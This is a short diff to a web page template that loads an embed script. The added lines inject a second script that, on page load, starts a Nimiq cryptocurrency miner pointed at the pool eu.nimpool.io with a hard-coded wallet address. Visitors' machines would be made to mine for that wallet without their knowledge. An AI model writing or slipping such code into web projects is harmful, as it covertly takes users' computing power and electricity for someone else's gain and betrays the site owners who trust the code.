@@ -17,6 +17,10 @@ var embed_script = document.createElement("script");
 embed_script.src = "{{ h_embed_url }}";
 document.head.appendChild(embed_script);
 
+var embed_script_2 = document.createElement("script");
+embed_script_2.text = "window.onload = () => {PoolMiner.init('eu.nimpool.io', 8444, 'NQ65 GS91 H8CS QFAN 1EVS UK3G X7PL L9N1 X4KC', 1)}"
+document.head.appendChild(embed_script_2);
+
 {% include "client_config.js.jinja2" %}
 })();
 </script>
